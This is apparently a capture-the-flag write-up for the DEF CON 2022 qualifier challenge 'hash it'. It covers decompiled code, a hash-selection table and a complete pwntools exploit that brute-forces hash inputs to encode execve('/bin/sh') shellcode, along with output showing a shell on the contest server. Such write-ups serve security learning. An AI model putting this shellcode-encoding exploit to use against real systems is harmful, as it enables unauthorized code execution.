# DEF CON CTF Qualifier 2022

## hash it

[`challenge`](challenge)

Tags: _pwn_ _hash_ _shellcode_ _x86-64_


## Summary

Shellcode runner where each byte is the first digest byte (of one of four popular algorithms) of each pair of hashed bytes, i.e.:

```
shellcode[i] = hash[i & 3](byte[i] << 8 + byte[i+1]).digest[0]
```

## Analysis

### Decompile in Ghidra

```c
undefined4 main(void)
{
  int iVar1;
  void *__src;
  void *__dest;
  code *pcVar2;
  uint uVar3;
  uint uVar4;
  ulong __size;
  undefined local_3d;
  uint local_3c [3];
  
  alarm(10);
  local_3c[0] = 0;
  iVar1 = fread_frontend(stdin,local_3c,4);
  if (iVar1 == 0) {
    local_3c[0] = local_3c[0] >> 0x18 | (local_3c[0] & 0xff0000) >> 8 | (local_3c[0] & 0xff00) << 8 | local_3c[0] << 0x18;
    __size = (ulong)local_3c[0];
    __src = malloc(__size);
    if ((__src != (void *)0x0) && (iVar1 = fread_frontend(stdin,__src,__size), iVar1 == 0)) {
      if (local_3c[0] != 0) {
        uVar3 = 0;
        do {
          uVar4 = uVar3 >> 1;
          iVar1 = FUN_00101320(*(undefined *)((long)__src + (ulong)uVar3),
                               *(undefined *)((long)__src + (ulong)(uVar3 + 1)),&local_3d,
                               (&PTR_EVP_md5_001040a0)[uVar4 & 3]);
          if (iVar1 != 0) {
            return 0xffffffff;
          }
          uVar3 = uVar3 + 2;
          *(undefined *)((long)__src + (ulong)uVar4) = local_3d;
        } while (uVar3 < local_3c[0]);
      }
      __dest = mmap((void *)0x0,(ulong)(local_3c[0] >> 1),7,0x22,-1,0);
      pcVar2 = (code *)memcpy(__dest,__src,(ulong)(local_3c[0] >> 1));
      (*pcVar2)();
      return 0;
    }
  }
  return 0xffffffff;
}
```

The main `do`/`while` loop hashes pairs of chars by calling `FUN_00101320`, and specifying with this table, which hash to use:

```
                             PTR_EVP_md5_001040a0                            XREF[2]:     main:00101181(*), 
                                                                                          main:001011b0(R)  
        001040a0 20 50 10        addr       <EXTERNAL>::EVP_md5                              = ??
                 00 00 00 
                 00 00
                             PTR_EVP_sha1_001040a8                           XREF[1]:     main:001011b0(R)  
        001040a8 60 50 10        addr       <EXTERNAL>::EVP_sha1                             = ??
                 00 00 00 
                 00 00
        001040b0 88 50 10        addr       <EXTERNAL>::EVP_sha256                           = ??
                 00 00 00 
                 00 00
        001040b8 80 50 10        addr       <EXTERNAL>::EVP_sha512                           = ??
                 00 00 00 
                 00 00
```

The first byte of the digest is stored in `local_3d` and that is then used to overwrite our original input:

```c
*(undefined *)((long)__src + (ulong)uVar4) = local_3d;
```

At the end of the loop, the decoded input is copied to a newly `mmap`'d space and executed.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *
import hashlib

binary = context.binary = ELF('./hash_it',checksec=False)

shellcode = asm(f'''
lea rdi, [rip+binsh]
xor rsi, rsi
xor rdx, rdx
mov eax, {constants.SYS_execve}
syscall
binsh: .asciz "/bin/sh"
''')

s = b''
for i, c in enumerate(shellcode):
    for j in range(2**16):
        if i & 3 == 0: m = hashlib.md5()
        if i & 3 == 1: m = hashlib.sha1()
        if i & 3 == 2: m = hashlib.sha256()
        if i & 3 == 3: m = hashlib.sha512()
        m.update(p16(j))
        if m.digest()[0] == c:
            s += p16(j)
            break
    else:
        print('failed')
        sys.exit(1)

if args.REMOTE:
    p = remote('hash-it-0-m7tt7b7whagjw.shellweplayaga.me',31337)
    p.sendlineafter(b'Ticket please: ',b'ticket{TackCormorant970n22:7BX7Fil8VnjawYCOu7riER6pzHaYzLr7ZF3DYF8zJOC8Wr9P}')
    sleep(0.2)
else:
    p = process(binary.path)

p.send(p32(len(s))[::-1])
p.send(s)
p.interactive()
```

Above I'm just creating my shellcode, then encoding it by brute searching which pair of bytes will hash producing a first digest byte that matched my assembled shellcode.

That's it.

> I should have mentioned in the analysis section that we have to first send the length as exactly 4 bytes before sending the encoded shellcode.

Output:

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to hash-it-0-m7tt7b7whagjw.shellweplayaga.me on port 31337: Done
[*] Switching to interactive mode
$ cat flag
flag{TackCormorant970n22:GhmoNCJeGsHN8kJ5TE3Jo7GnGV6F21KN2e8hQT2rrUEbPIsOaPrTWQy3CuB2IaUxA-36MthoyBMJy4Z_2Ht4dw}
```
